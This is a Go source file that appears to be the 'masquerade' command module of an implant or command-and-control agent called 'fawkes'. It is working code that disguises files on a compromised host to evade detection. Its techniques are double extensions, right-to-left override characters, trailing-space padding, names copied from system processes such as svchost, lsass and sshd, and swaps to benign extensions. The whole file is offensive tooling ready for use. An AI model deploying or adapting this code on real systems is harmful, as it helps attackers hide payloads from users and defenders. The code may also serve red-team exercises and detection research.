package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type MasqueradeCommand struct{}

func (c *MasqueradeCommand) Name() string {
	return "masquerade"
}

func (c *MasqueradeCommand) Description() string {
	return "File masquerading — rename/copy files with deceptive names to evade detection"
}

type masqueradeArgs struct {
	Source    string `json:"source"`
	Technique string `json:"technique"`
	Disguise  string `json:"disguise"`
	InPlace   bool   `json:"in_place"`
}

func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
	var args masqueradeArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Source == "" {
		return errorResult("Error: source file path is required")
	}
	if args.Technique == "" {
		return errorResult("Error: technique is required (double_ext, rtlo, space, process, match_ext)")
	}

	// Verify source exists
	srcInfo, err := os.Stat(args.Source)
	if err != nil {
		return errorf("Error: source file not found: %v", err)
	}
	if srcInfo.IsDir() {
		return errorResult("Error: source must be a file, not a directory")
	}

	// Generate the masqueraded filename
	destName, err := generateMasqueradeName(args.Source, args.Technique, args.Disguise)
	if err != nil {
		return errorf("Error generating masquerade name: %v", err)
	}

	destPath := filepath.Join(filepath.Dir(args.Source), destName)

	if args.InPlace {
		// Rename in place
		if err := os.Rename(args.Source, destPath); err != nil {
			return errorf("Error renaming file: %v", err)
		}
		return successf("[+] Masqueraded (renamed in-place)\n  Source:  %s\n  Result:  %s\n  Technique: %s", args.Source, destPath, args.Technique)
	}

	// Copy with new name
	if err := copyFile(args.Source, destPath); err != nil {
		return errorf("Error copying file: %v", err)
	}

	return successf("[+] Masqueraded (copied)\n  Source:  %s\n  Result:  %s\n  Technique: %s", args.Source, destPath, args.Technique)
}

func generateMasqueradeName(source, technique, disguise string) (string, error) {
	baseName := filepath.Base(source)
	ext := filepath.Ext(source)
	nameWithoutExt := strings.TrimSuffix(baseName, ext)

	switch technique {
	case "double_ext":
		// document.pdf.exe — looks like PDF but is actually an EXE
		if disguise == "" {
			disguise = "document.pdf"
		}
		return disguise + ext, nil

	case "rtlo":
		// Unicode Right-to-Left Override (U+202E) reverses display of extension
		// Example: payload\u202Etxt.exe displays as payload‮txt.exe (looks like .txt)
		if disguise == "" {
			disguise = "txt"
		}
		// Reverse the disguise extension so it displays correctly after RtLO
		reversed := reverseString(disguise)
		return nameWithoutExt + "\u202e" + reversed + ext, nil

	case "space":
		// Trailing spaces before the real extension
		// Example: document.txt                    .exe
		if disguise == "" {
			disguise = "txt"
		}
		spaces := strings.Repeat(" ", 30)
		return nameWithoutExt + "." + disguise + spaces + ext, nil

	case "process":
		// Match a legitimate Windows process name
		if disguise == "" {
			disguise = "svchost"
		}
		processNames := map[string]string{
			"svchost":    "svchost.exe",
			"explorer":   "explorer.exe",
			"csrss":      "csrss.exe",
			"lsass":      "lsass.exe",
			"services":   "services.exe",
			"wininit":    "wininit.exe",
			"smss":       "smss.exe",
			"taskhostw":  "taskhostw.exe",
			"conhost":    "conhost.exe",
			"dllhost":    "dllhost.exe",
			"spoolsv":    "spoolsv.exe",
			"msdtc":      "msdtc.exe",
			"searchindexer": "SearchIndexer.exe",
		}
		// Linux/macOS equivalents
		if runtime.GOOS != "windows" {
			processNames = map[string]string{
				"cron":       "cron",
				"systemd":    "systemd-logind",
				"sshd":       "sshd",
				"rsyslogd":   "rsyslogd",
				"dbus":       "dbus-daemon",
				"polkitd":    "polkitd",
				"dockerd":    "dockerd",
				"containerd": "containerd",
			}
		}
		if name, ok := processNames[strings.ToLower(disguise)]; ok {
			return name, nil
		}
		// Use the disguise as-is if not in the list
		if runtime.GOOS == "windows" && !strings.HasSuffix(disguise, ".exe") {
			return disguise + ".exe", nil
		}
		return disguise, nil

	case "match_ext":
		// Change extension to match a benign file type
		if disguise == "" {
			disguise = "txt"
		}
		return nameWithoutExt + "." + disguise, nil

	default:
		return "", fmt.Errorf("unknown technique: %s (use double_ext, rtlo, space, process, match_ext)", technique)
	}
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return err
	}

	// Preserve permissions
	srcInfo, err := os.Stat(src)
	if err == nil {
		os.Chmod(dst, srcInfo.Mode())
	}

	return nil
}
